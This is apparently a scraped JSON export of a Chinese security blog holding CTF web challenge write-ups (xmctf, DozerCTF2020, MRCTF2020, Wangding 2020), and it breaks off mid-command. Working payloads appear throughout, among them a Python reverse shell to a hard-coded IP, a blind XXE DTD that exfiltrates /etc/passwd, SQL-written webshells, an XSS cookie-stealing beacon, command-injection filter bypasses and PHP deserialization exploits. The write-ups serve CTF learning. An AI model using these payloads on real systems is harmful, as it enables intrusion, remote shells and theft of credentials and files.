命令行运行node.js脚本\n\n安装node.js后，只需在命令行输入node即可进入交互环境\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628164911.png)\n\n可以直接在命令行中执行js代码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628165757.png)\n\n也可执行目录下js脚本\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628201419.png)\n\n","tags":["Node.js"],"categories":["web安全"]},{"title":"xmctf平台部分web","url":"/2020/06/24/xmctf_web_wp/","content":"\nxmctf部分web\n\n平台：xmctf.top\n\n<!-- more -->\n\n### easy-web\n\n打开靶机源码如下\n\n```php\n<?php\nshow_source(__FILE__);\n$key = \"bad\";\nextract($_POST);\nif($key === 'bad'){\n    die('badbad!!!');\n}\n$act = @$_GET['act'];\n$arg = @$_GET['arg'];\nif(preg_match('/^[a-z0-9_]*$/isD',$act)) {\n    echo 'check';\n} else {\n    $act($arg,'');\n}\n\necho '666';\nbadbad!!!\n```\n\n存在一个变量key为bad，定义了值为bad所以die出badbad，get传参两个参数act和arg，正则匹配a-z，0-9，/i不区分大小写\n/s匹配任何不可见字符，包括空格、制表符、换页符等等，/D如果使用$限制结尾字符,则不允许结尾有换行\n\n需要绕过if正则匹配，从而控制arg参数\n\n考点：create_function代码注入\n\n> create_function：根据传递的参数创建匿名函数，并为其返回唯一名称\n>\n> 语法:\n> create_function(string $args,string $code)\n> //string $args 声明的函数变量部分\n> //string $code 执行的方法代码部分\n\n第一步要让key不die掉，直接post一个key把原来的key覆盖掉即可\n然后想要函数正常调用，那就必须绕过正则，因此我们要在函数名的头或者尾加上一个字符`\\`\n\n> php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。\n\n那么接下来就是利用` $act($arg,'');`进行代码注入了。\n\npayload：`?act=\\create_function&arg=){return%20123;}system(%27dir%27);//`\n传入之后\n\n```\n$act($arg,'');\ncreate_function(){return%20123;}system(%27dir%27);//,'')\n```\n\n实际上也就是这样\n\n```\nfunction a{\nreturn%20123;}system(%27dir%27);//\n```\n\n函数被闭合，就可以执行任意命令了。\n读flag:\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623224807.png)\n\n### RCE-训练\n\n打开靶机得源码\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__file__);\n$ip = $_GET['ip'];\nif (isset($ip)) {\n  if(preg_match(\"/(;|`| |&|cp|mv|cat|tail|more|rev|tac|\\*|\\{)/i\", $ip)){\n      die(\"hack\");\n  }else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){\n      die(\"no!>\");\n  }\n  $a = shell_exec(\"ping -c 4 \".$ip);\n  var_dump($a);\n}\n?>\n```\n\n主要两个正则，第一个过滤一些文件读取命令，第二个匹配flag的任意单个或多个字符串。\n经测试可以用`|`进行命令执行\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623225636.png)\n\n那么关键是绕过了，可以利用shell命令构造\n\npayload：`?ip=127.0.0.1|echo$IFS$9bHMgLw|base64$IFS$1-d|sh`\n$IFS$9代替空格，bHMgLw->ls /，输出给base64还原然后sh执行\n\n那么读取flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623230422.png)\n\n### web4\n\n打开靶机有一串md5代码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624074453.png)\n\n解析后为1.1.1.1，抓包加个xff头成功下一步\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624075157.png)\n\n打开php得源码\n\n```php\n<?php\nshow_source(__FILE__);\nerror_reporting(0);\n$disable_fun = [\"assert\",\"print_r\",\"system\", \"shell_exec\",\"ini_set\", \"scandir\", \"exec\",\"proc_open\", \"error_log\", \"ini_alter\", \"ini_set\", \"pfsockopen\", \"readfile\", \"echo\", \"file_get_contents\", \"readlink\", \"symlink\", \"popen\", \"fopen\", \"file\", \"fpassthru\"];\n$disable_fun = array_merge($disable_fun, get_defined_functions()['internal']);\nforeach($disable_fun as $i){\n    if(stristr($_GET[shell], $i)!==false){\n        die('xmctf');\n    }\n}\neval($_GET[shell]);\n```\n\ndisable_fun列表是一些文件操作函数，array_merge将多个数组单元合并，get_defined_functions返回数组，foreach遍历新的disable_function并传递给$i，if检测如果传入的shell中在数组中出现，则die，过了if检测则输出shell内容\n\n直接变量拼接，payload：?shell=$a;$a='syst'.'em';$a(\"cat flag.php\");\n传入在源码得到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083307.png)\n\n### web8\n\n打开靶机\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083629.png)\n\n传入`?name={{2*2}}`回显\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083748.png)\n\n猜测为模板注入，`{{config}}`查看配置信息，发现secret_key泄露\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085221.png)\n\n那么考虑session伪造了，查看cookie部分发现jwt\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085025.png)\n\n解密得`{'username': b'guest'}`，利用flask_session_cookie_manager脚本伪造admin\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085650.png)\n\n修改session访问/flag即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085732.png)\n\n### web11\n\n打开靶机只有一句hello，guest，讲道理要是没做web8我都想不到要传name。。。。\n测试之后发现还是模板注入，\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194649.png)\n\n不过测试之后发现过了了很多东西，config，下划线，点号等等\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194943.png)\n\n也没有了session伪造不了，那么只能命令执行了。\n\npayload：\n\n```\n{{\"\"[request[\"ar\"+\"gs\"][\"class\"]][request[\"ar\"+\"gs\"][\"mro\"]][1][request[\"ar\"+\"gs\"][\"subclass\"]]()[286][request[\"ar\"+\"gs\"][\"init\"]][request[\"ar\"+\"gs\"][\"globals\"]][\"os\"][\"popen\"](request[\"ar\"+\"gs\"][\"cmd\"])[\"read\"]()}}&class=__class__&mro=__mro__&subclass=__subclasses__&init=__init__&globals=__globals__&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"47.98.134.220\",3122));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n用`request[\"args\"][\"xx\"]`配合赋值代替双下划线，后面开个python服务器连上自己的ecs，nc监听\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200625205840.png)\n\n读取flag即可。\n\n### web12\n\n打开靶机得源码\n\n```php\nflag在哪里呢？\n<?php\nheader(\"Content-Type: text/html;charset=utf-8\");\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nhighlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n```\n\n主要三层正则匹配，第一层禁用了几个伪协议，第二层匹配a-z，逗号，下划线，(?R)引用当前表达式，(?R)?代表可以有引用，也可以没有，引用则变成`[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\)`的形式，可以一直迭代下去。这样可以匹配一些诸如print(echo(1))括号和字符组成的字符集，第三个禁用一些函数\n\npayload：`?exp=print_r(scandir(pos(localeconv())));`，scandir列出目录，pos返回数组中的当前单元, 默认取第一个值，localeconv返回数组。\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624201535.png)\n\n那么读取flag.php，next函数读取php的第一个元素的下一个元素，flag.php是倒数第二个，所以可以把用array_reverse把数组倒过来再用next指向flag.php，最后用highlight_file读取。\npayload：`highlight_file(next(array_reverse(scandir(pos(localeconv())))));`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624202207.png)","tags":["bypass","ssti","RCE"],"categories":["CTF"]},{"title":"DozerCTF2020部分web复现","url":"/2020/06/20/DozerCTF_web_wp/","content":"\n前几天打的比赛，web只做出了两道签到题，域渗透的题暂且搁置，想着就把其他的web复现一下吧。\n\n平台：http://ctf.dozerjit.club:8000/\n\n<!-- more -->\n\n#### sqli-labs 0\n\nsql-labs改的题，试了很多种姿势都没让id报错，后来还是官方出了hint让尝试url二次编码(喷)才成功\n\n![image-20200619153205929](/images/image-20200619153205929.png)\n\n之前在测试中发现select，union之类的都被过滤了，开始以为是盲注，所以写了个脚本出了数据库\n\n```python\nimport requests\n\nwords = \"Dumb\"\nresult = \"\"\nfor i in range(1,20):\n    print('--------------------------')\n    for j in range(32,129):\n        url = 'http://118.31.11.216:30501/?id=1%2527/**/and/**/ascii(substr(database(),{},1))>{}'.format(i,j)\n        re=requests.get(url+'%2523').text\n        if words not in re:\n            result+=chr(j)\n            print(result)\n            break\n```\n\n![image-20200619153929460](/images/image-20200619153929460.png)\n\n但后来继续跑的时候老报错，仔细看了fuzz才发现点号`.`被过滤了。。。。。那么啥都不能用了，只剩个网鼎2018的堆叠注入。\n\n![image-20200619154141735](/images/image-20200619154141735.png)\n\n然后尝试过比如重命名的payload不知道为啥没打通\n\n最后还是用了handler\n\n`1%2527;handler uziuzi open as a;handler a read first;%2523`\n\n![image-20200619154316727](/images/image-20200619154316727.png)\n\n#### 白给的反序列化\n\n打开靶机直接给出代码，审计一波\n\n```php\n<?php\n\nclass home\n{\n    private $method;\n    private $args;  //私有类型定义两个变量\n    function __construct($method, $args)\n    {\n        $this->method = $method;\n        $this->args = $args;\n    }\n\n    function __destruct()\n    {\n        if (in_array($this->method, array(\"mysys\"))) {  //当method为mysys时\n            call_user_func_array(array($this, $this->method), $this->args);\n        } //调用mysys函数，并把args作为mysys的数组参数回调\n    }\n\n    function mysys($path)\n    {\n        print_r(base64_encode(exec(\"cat $path\")));\n    }//把结果base64编码打印\n    function waf($str)\n    {\n        if (strlen($str) > 8) {\n            die(\"No\");\n        }//限制字符串长度\n        return $str;\n    }\n\n    function __wakeup()\n    {\n        $num = 0;\n        foreach ($this->args as $k => $v) {\n            $this->args[$k] = $this->waf(trim($v));\n            $num += 1;//遍历出$k和$v然后计算$v里的空格，大于2则die\n            if ($num > 2) {\n                die(\"No\");\n            }\n        }\n    }\n}\n\nif ($_GET['path']) {//如果传入path反序列化path\n    $path = @$_GET['path'];\n    unserialize($path);\n} else {\n    highlight_file(__FILE__);\n\n}\n?>\n```\n\n虽然有两个waf，但其实限制并不生效，因为无论前面有没有die，析构函数`__destruct`最后都会触发，因此只要保证method是'mysys'，args为数组参数就可以了，还有就是由于method和args是私有类型，所以最后payload用url方式打印出即可\n\nexp:\n\n```php\n<?php\nclass home\n{\n    private $method='mysys';\n    private $args=array('flag.php');\n}\n$a = new home();\necho urlencode(serialize($a));\n?>\n//O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A5%3A%22mysys%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22flag.php%22%3B%7D%7D\n```\n\nget传入后再base64解码一下即可\n\n![image-20200619162357657](/images/image-20200619162357657.png)\n\n#### svgggggg!\n\n这道题磨了好久还是没做出来。。。（菜到自闭）\n\n考点：bind xxe，ssrf\n\n打开靶机是个svg检验\n\n![image-20200619162628192](/images/image-20200619162628192.png)\n\n访问目标除了svg文件都只会`Unauthorized type!`\n\nbind xxe参考：[XXE漏洞利用技巧：从XML到远程代码执行](freebuf.com/articles/web/177979.html)\n\n在ecs上构造两个文件：xxe.svg，xxe.dtd\n\n```\nxxe.svg\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n <!DOCTYPE foo [  \n   <!ELEMENT svg ANY >\n   <!ENTITY % remote SYSTEM \"http://yourip/xxe.dtd\" >\n%remote;%data;\n   ]>\n   <svg height=\"100\" width=\"1000\">\n   &res;\n   </svg>\n  \nxxe.dtd\n<!ENTITY % show SYSTEM \"php://filter/convert.base64-encode/resource=file:///etc/passwd\" >\n<!ENTITY % data \"<!ENTITY res SYSTEM 'http://yourip:your port/?%show;'>\">\n```\n\n然后建立一个http服务监听数据，\n\n![image-20200619215906958](/images/image-20200619215906958.png)\n\n请求xxe.svg\n\n![image-20200620102634408](/images/image-20200620102634408.png)\n\n可以看到已经读出来了/etc/passwd的内容\n\n![image-20200619220044010](/images/image-20200619220044010.png)\n\n那么我们就可以开始读数据了，根据提示用户r1ck的历史操作我们读/home/r1ck/.bash_history文件内容\n\n![image-20200619220254637](/images/image-20200619220254637.png)\n\n```\ncd /app\nphp -S 0.0.0.0:8080\n```\n\n得知在app目录下开启了一个php的web服务，那么读取index.php的源码\n\n![image-20200620102802726](/images/image-20200620102802726.png)\n\n```php+HTML\n<!doctype html>\n<html>\n<head>\n<meta charset=\"UTF-8\">\n<title>index</title>\n</head>\nHi!\nYou Find Me .\nFlag is nearby.\n<body>\n</body>\n</html>\n<?php \n\n$conn=mysql_connect('127.0.0.1','root','');\nmysql_select_db('security');\n\nif ($_GET['id']){\n    $id = $_GET['id'];\n}\nelse \n    $id = 1;\n$sql = \"select * from user where id='$id'\";\n$result = mysql_query($sql,$conn);\n$arr = mysql_fetch_assoc($result);\nprint_r($arr);\n\n?>\n```\n\n存在sql注入，并且hint2提示直接getshell，可以union联合使用into outfile写入shell\n\n`-1' union select 1,'<?php system($_GET[cmd]);?>' into outfile'/app/shell.php'#`\n\n但直接写的话进不去，那么hex编码一下，由于是get请求，也url处理一下\n\n`-1%27%20union%20select%201,0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e%20into%20outfile%27/app/blacknight.php%27%23`\n\n这里要说一下，开始我写/app/shell.php都不成功，或许是文件存在了写不了？反正自己写个其他的文件名就行了\n\n![image-20200620101653615](/images/image-20200620101653615.png)\n\n解码全是师傅们的shell，还有个H3re_1s_y0ur_f14g.php\n\n那么cat读取\n\n![image-20200620101831229](/images/image-20200620101831229.png)\n\n#### fake phpminiadmin\n\nsql输入框存在xss，将payload hex编码后可触发\n\n![image-20200619232118432](/images/image-20200619232118432.png)\n\n提示\n\n![image-20200619233403673](/images/image-20200619233403673.png)\n\n考点：content处csrf\n\n拿xss平台的的payload改一下把数据传到自己的ecs上\n\n```\n<script>(function(){(new Image()).src='http://yourip:yourport/index.php?do=api&id=XI0O1O&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();</script>\n```\n\n然后貌似可以拿burp生成csrf的payload，以后研究一下，这里直接拿官方的，在ecs上创建一个xss.php，内容如下\n\n```\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://127.0.0.1/sql.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"sql\" value=\"select 0x hex后上述payload\" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>\n```\n\n创建好之后在ecs上开启一个python http服务等着\n\n回到靶机，在content处输入xss.php的请求地址\n\n![image-20200620114327075](/images/image-20200620114327075.png)\n\n递交需要code，md5之后前六位为75d8be，脚本爆破一下\n\n```python\nimport hashlib\n\ndef func(md5_val):\n    for x in range(999999, 100000000):\n        md5_value=hashlib.md5(str(x)).hexdigest()\n        if md5_value[:6]==md5_val:\n            return str(x)\n\nif __name__ == '__main__':\n    print func('75d8be')\n    //6042761\n```\n\n我们递交之后管理员访问content的内容，之后触发构造好的xss并在sql输入框自动提交表单，管理员的cookie等内容就被带出来了。\n\n提交我们可以看到ecs上已经返回数据了\n\n![image-20200620114518271](/images/image-20200620114518271.png)\n\n我们可以看到带出了后台地址，这里可以参考[这位师傅](https://www.cnblogs.com/afanti/p/8277344.html)的帖子构造payload获取后台源码\n\n构造\n\n```js\n<script>\nfunction createXmlHttp() {\n    if (window.XMLHttpRequest) {\n        xmlHttp = new XMLHttpRequest()\n    } else {\n        var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');\n        for (var n = 0; n < MSXML.length; n++) {\n            try {\n                xmlHttp = new ActiveXObject(MSXML[n]);\n                break\n            } catch(e) {}\n        }\n    }\n}\ncreateXmlHttp();\nxmlHttp.onreadystatechange = function(){\n  if (xmlHttp.readyState == 4) {\n        code=escape(xmlHttp.responseText);\n        createXmlHttp();\n        url = \"http://ip:port\"; //这里是服务器接受的地址\n        cc = \"htmlcode=\" + code +\"&filename=index.html\";\n        xmlHttp.open(\"POST\", url, true);\n        xmlHttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n        xmlHttp.setRequestHeader(\"Referer\", \"http://127.0.0.1/\");\n        xmlHttp.setRequestHeader(\"Cookie\", \"PHPSESSID=tjuhvnkki74v7qf4lfp41li347\");\n        xmlHttp.send(cc)\n  }\n};\nxmlHttp.open(\"GET\", \"/admin_shark.php\", true);//这块填写获得的后台地址。\nxmlHttp.setRequestHeader(\"Cookie\", \"PHPSESSID=tjuhvnkki74v7qf4lfp41li347\");\nxmlHttp.send(null);</script>\n```\n\n同样hex编码之后放到xss.php中，然后content请求\n\n这里换成nc监控\n\n![image-20200620120034995](/images/image-20200620120034995.png)\n\n得到源码以及flag\n\n![image-20200620120153097](/images/image-20200620120153097.png)\n\n","tags":["xss","xxe"],"categories":["CTF"]},{"title":"MRCTF2020——Ezpop","url":"/2020/06/17/buu17——[MRCTF2020]Ezpop/","content":"\n平台：buuoj.cn\n打开靶机得源码\n\n```php\n<?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\n    protected  $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"<br>\";\n    }\n    public function __toString(){\n        return $this->str->source;\n    }\n\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        }\n    }\n}\n\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n}\n```\n共涉及以下魔术方法\n\n```php\n__construct()  当一个对象创建时被调用\n__toString()  当一个对象被当作一个字符串使用\n__wakeup()  将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)\n__get()  获得一个类的成员变量时调用\n__invoke()  调用函数的方式调用一个对象时的回应方法\n```\n定义了三个类\nModifier:\n```php\nclass Modifier {\n    protected  $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\n```\n声明保护字段类型`$var`\n声明函数append，包含传入的文件\n如果把对象当作一个函数调用时，触发`__invoke()`方法，然后包含文件\nShow:\n\n```php\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"<br>\";\n    }\n    public function __toString(){\n        return $this->str->source;\n    }\n\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        }\n    }\n}\n```\n创建对象时触发`__construct()`方法，打印welcome to index.php，对象被当作字符串使用时触发`__tostring()`，序列化之后触发`__wakeup`，过滤了几个协议。\nTest：\n```php\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n```\n`__construct()`把p转换成数组，读取不可访问属性的值时调用`__get()` ，把p以函数的形式返回。\n\n解题：\n我们看到Modifier类中有文件包含，且提示flag在flag.php中，因此我们的目的是能够读到`include(flag.php)`，虽然过滤了几个协议，但filter没被过滤。\n从反序列化进程开始分析，首先反序列化之后会触发`__wakeup()`，接着`__wakeup()`又会直接触发`__tostring()`，从而访问str的成员source，这时如果我们让str等于Test类对象，由于Test中没有source，就会触发`__get()`，将`$p`以函数的形式返回，而我们再让`$p`等于Modifier的话，`__invoke()`方法就会触发，从而自动调用append函数包含flag.php\n\nexp：\n\n```php\n<?php\nclass Modifier {\n\tprotected  $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";\n\n}\n\nclass Test{\n    public $p;\t\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __construct(){\n        $this->str = new Test();\n    }\n}\n\n$a = new Show();//此时source(show)->str\n$a->source = new Show();//source(show)->str之后触发__tostring然后访问source(test)触发__get\n$a->source->str->p = new Modifier();//__get返回的p触发__invoke\necho serialize($a);\n?>\n//O:4:\"Show\":2:{s:6:\"source\";O:4:\"Show\":2:{s:6:\"source\";N;s:3:\"str\";O:4:\"Test\":1:{s:1:\"p\";O:8:\"Modifier\":1:{s:6:\" * var\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";}}}s:3:\"str\";O:4:\"Test\":1:{s:1:\"p\";N;}}\n```\n由于var是protected类型，所以payload中需要用%00把它的位数补齐，或者直接最后url编码输出\n最后传入pop得到base64编码，解码即得flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200617213137619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020061721323182.png)\n","tags":["serialize","代码审计"],"categories":["buu刷题"]},{"title":"MRCTF2020——套娃","url":"/2020/06/12/buu16——[MRCTF2020]套娃/","content":"\n平台：buuoj.cn\n打开靶机源码处php代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200612100526920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n第一个if如果传入的参数出现`_`和它的url编码`%5f`，则打印Y0u are So cutE!\n绕过：用`.`或空格代替`_`\n第二个if要b_u_r_t的值为23333但添加了正则匹配，用`^`和`$`来界定23333的首尾，代表了“行的开头和结尾”，只匹配一行，因此%0a换行绕过\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200612103053595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n打开secrettw.php\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200612103336714.png)\n提示本地，xff不行，用client-ip\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200612103449400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n下面的jsfuck代码直接控制台输出\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200612103720862.png)\n那么就post一个Merak随便传个值\n回显php，代码如下\n\n```php\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\n\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \n\n\nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?>\n```\n看最后一个if，\\$ip===127.0.0.1刚已经用client-ip满足条件，file_get_content使用伪协议`2333=data:text/plain,todat is a happy day`\n满足if之后就会打印出get传入file指名文件的内容。\n我们的目的是读取flag.php，但file名经过了change函数处理，把flag.php处理成乱码字符\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020061210515899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n那么反过来，让传入的字符串经过change之后变成flag.php即可\n\n```php\n<?php\n\nfunction change($v){ \n\n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) - $i*2 ); \n    } \n    return $re; \n}\n$v = 'flag.php';\necho base64_encode(change($v));\n//ZmpdYSZmXGI=\n```\n最终payload\n\n```php\n?2333=data:text/plain,todat is a happy day&file=ZmpdYSZmXGI=\n```\n传入即可\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200612110219370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["代码审计"],"categories":["buu刷题"]},{"title":"网鼎杯2020朱雀组——phpweb","url":"/2020/06/07/buu15——[wangdingbei 2020 朱雀组]phpweb/","content":"\n平台 ：buuoj.cn\n打开靶机一张众生皆懒狗(拜)\n观察到会自动刷新时间，截个包\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200607112651183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\nfunc调用函数p作为参数，那么代码执行\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200607112849760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\nindex.php如下\n\n```php\n <?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n$disable_fun过滤了一大堆函数。\n注意到test类中有__destruct魔法函数，直接用系统命令读文件，构造反序列化尝试\n\n```php\n<?\nclass Test {\n        public $p = \"ls /\";\n        public $func = \"system\";\n    }\n$a = new Test();\necho serialize($a);\n```\nfunc反序列化，p字符串执行\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200607114343894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n`find / -name 